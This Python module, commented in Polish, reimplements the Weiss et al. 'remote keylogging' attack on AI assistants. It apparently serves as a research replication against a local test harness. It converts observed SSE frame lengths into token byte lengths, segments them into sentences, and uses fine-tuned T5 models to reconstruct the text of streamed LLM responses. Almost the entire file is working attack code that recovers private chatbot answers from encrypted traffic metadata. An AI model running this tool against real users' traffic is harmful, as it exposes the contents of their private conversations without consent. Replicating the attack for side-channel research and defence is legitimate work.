"""
Rekonstrukcja odpowiedzi LLM na podstawie kanału bocznego długości tokenów.

Adaptacja metody z artykułu:
  Weiss et al. "What Was Your Prompt? A Remote Keylogging Attack on AI Assistants"
  USENIX Security 2024

Integruje się z:
  - client.collect_frame_lengths() — długości ramek SSE
  - logi JSON z app.py (LOG_DIR) — token_utf8_len z kroków generowania
"""

from __future__ import annotations

import json
import os
import re
from dataclasses import dataclass
from pathlib import Path

# SSE frame prefix "data: " = 6 bajtów, suffix "\n\n" = 2 bajty
SSE_FRAME_OVERHEAD = 8

# Modele fine-tunowane z paperu (T5)
FIRST_SENTENCES_MODEL = "royweiss1/T5_FirstSentences"
MIDDLE_SENTENCES_MODEL = "royweiss1/T5_MiddleSentences"

LOG_DIR = os.environ.get("LOG_DIR", "./logs")
MIN_SEGMENT_TOKENS = 10
DEFAULT_MAX_LENGTH = 80
_MODEL_CACHE: dict[str, tuple] = {}


def frame_lengths_to_token_lengths(frame_lengths: list[int]) -> list[int]:
    """
    Konwertuje długości ramek SSE na długości tokenów (bajty UTF-8).

    Format ramki: "data: <token>\\n\\n" → token_len = frame_len - 8
    Ostatnia ramka (client przerywa po niej) to zazwyczaj [DONE] — jest pomijana.
    """
    if not frame_lengths:
        return []

    # Client dodaje ramkę przed break, więc ostatni element to [DONE]
    frames = frame_lengths[:-1]

    token_lengths = []
    for fl in frames:
        if fl < SSE_FRAME_OVERHEAD:
            continue
        tok_len = fl - SSE_FRAME_OVERHEAD
        token_lengths.append(tok_len)

    return token_lengths


def load_token_lengths_from_log(run_id: str, log_dir: str = LOG_DIR) -> list[int]:
    """
    Wczytuje token_utf8_len z pliku logu dla danego run_id.
    """
    log_path = Path(log_dir) / f"{run_id}.json"
    if not log_path.exists():
        raise FileNotFoundError(f"Log nie istnieje: {log_path}")
    with open(log_path, encoding="utf-8") as f:
        data = json.load(f)
    steps = data.get("steps", [])
    return [s["token_utf8_len"] for s in steps]


def heuristic_sentences_from_lengths(lengths: list[int]) -> list[list[int]]:
    """
    Heurystyczny podział sekwencji długości tokenów na zdania.

    Implementuje opis z papera:
    1) split po tokenach długości 1 (interpunkcja),
    2) segmenty <10 tokenów są łączone z kolejnym segmentem,
    3) edge-case dla sekwencji listy (3,1,1) przenoszony na początek
       kolejnego segmentu.
    """
    if not lengths:
        return []

    # Krok 1: split po tokenach interpunkcyjnych (ti == 1)
    rough_segments: list[list[int]] = []
    current: list[int] = []
    for tok_len in lengths:
        current.append(tok_len)
        if tok_len == 1:
            rough_segments.append(current)
            current = []
    if current:
        rough_segments.append(current)

    if not rough_segments:
        return []

    # Krok 2: edge-case list ":\n\n1." => (3,1,1), przenosimy na kolejne zdanie.
    for idx in range(len(rough_segments) - 1):
        seg = rough_segments[idx]
        if len(seg) >= 3 and seg[-3:] == [3, 1, 1]:
            rough_segments[idx] = seg[:-3]
            rough_segments[idx + 1] = [3, 1, 1] + rough_segments[idx + 1]

    rough_segments = [seg for seg in rough_segments if seg]

    # Krok 3: merge segmentów krótszych niż 10 tokenów z następnym.
    merged: list[list[int]] = []
    i = 0
    while i < len(rough_segments):
        segment = rough_segments[i].copy()
        while len(segment) < MIN_SEGMENT_TOKENS and i + 1 < len(rough_segments):
            i += 1
            segment.extend(rough_segments[i])
        merged.append(segment)
        i += 1

    return merged


def make_input_from_lengths(lengths: list[int]) -> str:
    """
    Formatuje sekwencję długości tokenów jako wejście dla modelu T5.

    Zgodne z GPT_Keylogger _encoding_lengths: " _3 _2 _5".
    """
    parts = [" _" + str(x) for x in lengths]
    return "Translate the Special Tokens to English. \nSpecial Tokens:" + "".join(parts)


def make_input_with_context(lengths: list[int], context: str) -> str:
    """Formatuje wejście z kontekstem poprzedniego zdania."""
    parts = [" _" + str(x) for x in lengths]
    tokens_str = "".join(parts)
    return f"Translate the Special Tokens to English, given the context. \nContext: {context} \nSpecial Tokens:{tokens_str}"


@dataclass
class ReconstructionResult:
    """Wynik rekonstrukcji — pierwsze zdanie i ewentualne kolejne."""

    first_sentence: str
    full_text: str
    sentence_count: int
    top_candidates: list[str]


def _generate_with_compat_fallback(model, **gen_kwargs):
    """
    Kompatybilne wywołanie generate dla nowych wersji transformers.

    W transformers>=5 Group Beam Search został wydzielony do custom_generate
    i bez trust_remote_code rzuca ValueError. W takim przypadku przechodzimy
    na standardowy beam search (bez num_beam_groups / diversity_penalty).
    """
    try:
        return model.generate(**gen_kwargs)
    except ValueError as exc:
        msg = str(exc)
        if "Group Beam Search requires `trust_remote_code=True`" not in msg:
            raise

        fallback_kwargs = dict(gen_kwargs)
        fallback_kwargs.pop("num_beam_groups", None)
        fallback_kwargs.pop("diversity_penalty", None)
        return model.generate(**fallback_kwargs)


def _choose_device() -> str:
    try:
        import torch

        if getattr(torch, "cuda", None) and torch.cuda.is_available():
            return "cuda"
    except ImportError:
        pass
    return "cpu"


def _load_model_bundle(model_name: str):
    from transformers import AutoModelForSeq2SeqLM, AutoTokenizer

    cached = _MODEL_CACHE.get(model_name)
    if cached is not None:
        return cached

    model = AutoModelForSeq2SeqLM.from_pretrained(model_name)
    tokenizer = AutoTokenizer.from_pretrained(model_name)
    device = _choose_device()
    model = model.to(device)
    bundle = (model, tokenizer, device)
    _MODEL_CACHE[model_name] = bundle
    return bundle


def _prepare_input(tokenizer, device: str, text: str, max_length: int):
    inputs = tokenizer(
        [text],
        max_length=max_length,
        padding=True,
        truncation=True,
        return_tensors="pt",
    )
    return {k: v.to(device) for k, v in inputs.items()}


def _sample_and_rank(
    model,
    tokenizer,
    device: str,
    input_text: str,
    *,
    samples: int,
    max_length: int = DEFAULT_MAX_LENGTH,
) -> list[tuple[str, float]]:
    """
    Generuje `samples` niezależnych próbek i sortuje je wg confidence.
    Confidence liczymy jako sumę log-prawdopodobieństw tokenów generacji.
    """
    inputs = _prepare_input(tokenizer, device, input_text, max_length=max_length)
    best_per_text: dict[str, float] = {}

    for _ in range(max(1, samples)):
        outputs = _generate_with_compat_fallback(
            model,
            **inputs,
            max_length=max_length,
            output_scores=True,
            return_dict_in_generate=True,
            no_repeat_ngram_size=2,
            do_sample=True,
            top_k=50,
            temperature=1.0,
            num_return_sequences=1,
        )

        sequence = outputs.sequences[0:1]
        text = tokenizer.decode(sequence[0], skip_special_tokens=True).strip()
        if not text:
            continue

        try:
            transition_scores = model.compute_transition_scores(
                sequence,
                outputs.scores,
                normalize_logits=True,
            )
            confidence = float(transition_scores.sum().item())
        except Exception:
            confidence = float("-inf")

        existing = best_per_text.get(text)
        if existing is None or confidence > existing:
            best_per_text[text] = confidence

    ranked = sorted(best_per_text.items(), key=lambda item: item[1], reverse=True)
    return ranked


def reconstruct(
    token_lengths: list[int],
    num_first_candidates: int = 5,
    max_sentences: int = 5,
    samples_per_segment: int = 10,
) -> ReconstructionResult:
    """
    Rekonstruuje odpowiedź LLM z sekwencji długości tokenów (bajty UTF-8).

    Używa metody Weiss: heurystyka podziału na zdania, T5_FirstSentences
    dla pierwszego zdania, T5_MiddleSentences dla kolejnych z kontekstem.

    Args:
        token_lengths: Lista długości tokenów w bajtach (np. z frame_lengths).
        num_first_candidates: Ile kandydatów pierwszego zdania zwrócić.
        max_sentences: Maksymalna liczba rekonstruowanych zdań.

    Returns:
        ReconstructionResult z najlepszym pierwszym zdaniem i pełnym tekstem.
    """
    sentence_lengths = heuristic_sentences_from_lengths(token_lengths)
    if not sentence_lengths:
        return ReconstructionResult(
            first_sentence="",
            full_text="",
            sentence_count=0,
            top_candidates=[],
        )

    first_model, first_tokenizer, first_device = _load_model_bundle(FIRST_SENTENCES_MODEL)
    middle_model, middle_tokenizer, middle_device = _load_model_bundle(MIDDLE_SENTENCES_MODEL)

    # Rekonstrukcja pierwszego segmentu
    first_input = make_input_from_lengths(sentence_lengths[0])
    first_ranked = _sample_and_rank(
        first_model,
        first_tokenizer,
        first_device,
        first_input,
        samples=max(num_first_candidates, samples_per_segment),
    )
    candidates = [text for text, _ in first_ranked]
    best_first = candidates[0] if candidates else ""
    top_candidates = candidates[: max(1, num_first_candidates)]

    full_parts = [best_first]
    context = best_first

    # Rekonstrukcja kolejnych zdań (z kontekstem)
    for sent_lens in sentence_lengths[1:max_sentences]:
        next_sentence = _generate_middle_sentence(
            sent_lens,
            context,
            middle_model,
            middle_tokenizer,
            middle_device,
            samples=samples_per_segment,
        )
        if next_sentence:
            full_parts.append(next_sentence)
            context = next_sentence
        else:
            break

    return ReconstructionResult(
        first_sentence=best_first,
        full_text=_concat_segments(full_parts),
        sentence_count=len(full_parts),
        top_candidates=top_candidates,
    )


def _concat_segments(segments: list[str]) -> str:
    parts = [s.strip() for s in segments if s and s.strip()]
    if not parts:
        return ""
    text = " ".join(parts)
    return re.sub(r"\s+([,.;:!?])", r"\1", text)


def _generate_middle_sentence(
    lengths: list[int],
    context: str,
    model,
    tokenizer,
    device: str,
    *,
    samples: int,
) -> str:
    """Wywołuje model middle sentences z poprawnymi argumentami."""
    input_str = make_input_with_context(lengths, context)
    ranked = _sample_and_rank(
        model,
        tokenizer,
        device,
        input_str,
        samples=samples,
        max_length=DEFAULT_MAX_LENGTH,
    )
    return ranked[0][0] if ranked else ""


def reconstruct_from_frame_lengths(frame_lengths: list[int], **kwargs) -> ReconstructionResult:
    """
    Rekonstruuje odpowiedź z długości ramek SSE (wyjście client.collect_frame_lengths).
    """
    token_lengths = frame_lengths_to_token_lengths(frame_lengths)
    return reconstruct(token_lengths, **kwargs)


def main() -> None:
    """
    Demo: łączy client.collect_frame_lengths z rekonstrukcją Weiss.

    Użycie:
      python weiss_reconstruction.py           -- z żywego strumienia SSE
      python weiss_reconstruction.py <run_id>  -- z pliku logu (LOG_DIR)
    """
    import sys

    if len(sys.argv) >= 2:
        run_id = sys.argv[1]
        print(f"Wczytywanie z logu: {run_id}")
        token_lens = load_token_lengths_from_log(run_id)
        print(f"Otrzymano {len(token_lens)} tokenów z pliku logu.")
    else:
        from client import collect_frame_lengths, DEFAULT_PARAMS, URL

        print("Pobieranie strumienia SSE z harnessa...")
        frame_lens = collect_frame_lengths(URL, DEFAULT_PARAMS)
        print(f"Otrzymano {len(frame_lens)} ramek.")
        token_lens = frame_lengths_to_token_lengths(frame_lens)

    print(f"Długości tokenów (pierwsze 20): {token_lens[:20]}")

    if not token_lens:
        print("Brak tokenów do rekonstrukcji.")
        return

    print("\nRekonstrukcja (metoda Weiss)...")
    result = reconstruct(
        token_lens,
        num_first_candidates=3,
        max_sentences=3,
        samples_per_segment=10,
    )
    print(f"\nPierwsze zdanie (najlepsze): {result.first_sentence}")
    print(f"\nPełny tekst ({result.sentence_count} zdań): {result.full_text}")
    print("\nTop 3 kandydatów pierwszego zdania:")
    for i, c in enumerate(result.top_candidates, 1):
        print(f"  {i}. {c}")


if __name__ == "__main__":
    main()
